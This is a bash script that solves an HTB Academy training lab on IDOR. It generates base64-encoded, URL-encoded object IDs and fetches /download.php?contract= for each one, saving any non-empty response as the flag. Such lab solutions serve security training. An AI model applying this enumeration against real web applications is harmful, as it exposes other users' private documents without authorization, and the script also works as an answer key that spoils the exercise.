#!/usr/bin/env bash

: '
usage: <script_name> <IP-ADDRESS:PORT>

Platform: HTB Academy
Path: Web attacks
Module: Insecure Direct Object References (IDOR)
Chapter: Bypassing Encoded References
'

uri="$1"
ENDPOINT="/download.php?contract="

URL="http://${uri}${ENDPOINT}"

function create_payloads () {
    # create a file with base64 url encoded from 1 to 20
    for i in {1..20}
    do
        echo -n "$i" |base64 |xargs urlencode >> fuzzmedoc.txt
    done
}

function get_flag () {
    #ffuf -c -u "$URL"FUZZ -w fuzzmedoc.txt
    while read line
    do
        length=$(curl --silent -i "${URL}${line}" |grep -E "Content-Length:" |awk '{print $2}' |tr -d '\r')
        if (( "$length" > 0 ))
        then
            wget -q "${URL}${line}" -O flag.txt
        fi
    done < "fuzzmedoc.txt"
}

function main () {
    if [[ -f fuzzmedoc.txt ]]
    then
        get_flag
    else
        create_payloads
        get_flag
    fi
}

main
